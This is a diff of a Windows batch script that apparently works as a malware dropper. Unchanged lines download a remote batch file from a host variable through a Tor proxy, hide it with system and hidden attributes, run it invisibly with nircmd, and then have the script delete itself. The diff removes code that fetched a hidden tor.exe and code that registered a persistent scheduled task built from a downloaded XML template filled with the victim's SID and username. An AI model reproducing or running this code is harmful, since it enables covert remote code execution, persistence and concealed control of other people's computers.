@@ -13,12 +13,6 @@ rem TESTING >
 if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
 rem TESTING <
 
-if exist "%environment%\tor.exe" (
-    echo.
-) else (
-"%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz > "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
-)
-
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (echo) else (
   "%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
@@ -28,16 +22,6 @@ tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
   set "proxy=--tlsv1"
 )
-
-FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t
-curl -k %proxy% "https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/Task.xml" > "%SID%.xml"
-powershell -Command "(gc '%SID%.xml') -replace 'SID', '%SID%' | Out-File -encoding ASCII '%SID%.xml'"
-powershell -Command "(gc '%SID%.xml') -replace 'environment', '%environment%' | Out-File -encoding ASCII '%SID%.xml'"
-powershell -Command "(gc '%SID%.xml') -replace 'computername', '%computername%' | Out-File -encoding ASCII '%SID%.xml'"
-powershell -Command "(gc '%SID%.xml') -replace 'username', '%username%' | Out-File -encoding ASCII '%SID%.xml'"
-schtasks /Delete /TN "%SID%XYZ" /F
-schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
-del "%SID%.xml"
 
 attrib -s -h -i "%environment%\localtunnel"
 tasklist /fi "imagename eq localtunnel.exe" | find /i "localtunnel.exe" > nul
@@ -70,9 +54,10 @@ timeout -t 10
 copy /y "%environment%\apache2\conf\httpd.conf" "%environment%\apache2\conf\httpd.conf.log"
 move /y "%environment%\apache2\conf\httpd.conf.bak" "%environment%\apache2\conf\httpd.conf"
 
+timeout -t 300
+
 set "win32=%random%"
 "%environment%\curl.exe" -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
-timeout -t 300
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%win32%.bat"
 endlocal
 DEL /s /f /q /a "%~f0"
